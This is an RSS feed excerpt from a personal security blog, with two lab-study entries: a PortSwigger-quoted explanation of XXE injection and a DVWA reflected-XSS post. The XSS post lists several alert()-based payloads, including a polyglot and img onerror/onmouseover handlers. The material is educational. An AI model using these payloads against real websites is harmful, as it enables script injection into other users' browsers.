<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Web on Rich told me to blog</title>
    <link>//localhost:1313/categories/web/</link>
    <description>Recent content in Web on Rich told me to blog</description>
    <generator>Hugo</generator>
    <language>en-us</language>
    <copyright>take what you need © {year}</copyright>
    <lastBuildDate>Thu, 15 May 2025 16:06:04 +0100</lastBuildDate>
    <atom:link href="//localhost:1313/categories/web/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>XML external entity injection XXE</title>
      <link>//localhost:1313/portswigger/xxe-portswigger/</link>
      <pubDate>Thu, 15 May 2025 16:06:04 +0100</pubDate>
      <guid>//localhost:1313/portswigger/xxe-portswigger/</guid>
      <description>&lt;p&gt;XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application&amp;rsquo;s processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.&#xA;-Portswigger- &lt;a href=&#34;https://portswigger.net/web-security/xxe&#34;&gt;https://portswigger.net/web-security/xxe&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;Background&lt;/p&gt;&#xA;&lt;p&gt;XML, Extensible Markup Langauge is a language designed for storing and transporting data. Like HTML, XML uses a tree-like structure of tags and data. Unlike HTML, XML does not use predefined tags, and so tags can be given names that describe the data. Earlier in the web&amp;rsquo;s history, XML was in vogue as a data transport format (the &amp;ldquo;X&amp;rdquo; in &amp;ldquo;AJAX&amp;rdquo; stands for &amp;ldquo;XML&amp;rdquo;). But its popularity has now declined in favor of the JSON format.&#xA;-Portswigger- &lt;a href=&#34;https://portswigger.net/web-security/xxe/xml-entities&#34;&gt;https://portswigger.net/web-security/xxe/xml-entities&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Reflected XSS</title>
      <link>//localhost:1313/dvwa/xss-reflected/</link>
      <pubDate>Tue, 24 Dec 2024 16:06:04 +0100</pubDate>
      <guid>//localhost:1313/dvwa/xss-reflected/</guid>
      <description>&lt;p&gt;Reflected XSS is an injection attack where malicious scripts are sent to a vulnerable web server (often via URLs), and the server immediately includes (reflects) those scripts unsanitized in the HTML response back to the victim&amp;rsquo;s browser, which then executes them. It relies on the server reflecting user input directly into the response page.&lt;/p&gt;&#xA;&lt;p&gt;Examples:&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;javascript:/*--&amp;gt;&amp;lt;/title&amp;gt;&amp;lt;/style&amp;gt;&amp;lt;/textarea&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;/xmp&amp;gt;&#xA;&amp;lt;svg/onload=&amp;#39;+/&amp;#34;`/+/onmouseover=1/+/[*/[]/+alert(42);//&amp;#39;&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;IMG &amp;#34;&amp;#34;&amp;#34;&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(&amp;#34;XSS&amp;#34;)&amp;lt;/SCRIPT&amp;gt;&amp;#34;\&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;a href=&amp;#34;javascript:alert(String.fromCharCode(88,83,83))&amp;#34;&amp;gt;Click Me!&amp;lt;/a&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;IMG SRC=# onmouseover=&amp;#34;alert(&amp;#39;xxs&amp;#39;)&amp;#34;&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;IMG SRC=/ onerror=&amp;#34;alert(String.fromCharCode(88,83,83))&amp;#34;&amp;gt;&amp;lt;/img&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;DVWA has 3 settings to show different levels of security. Below are the bypasses for each level.&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
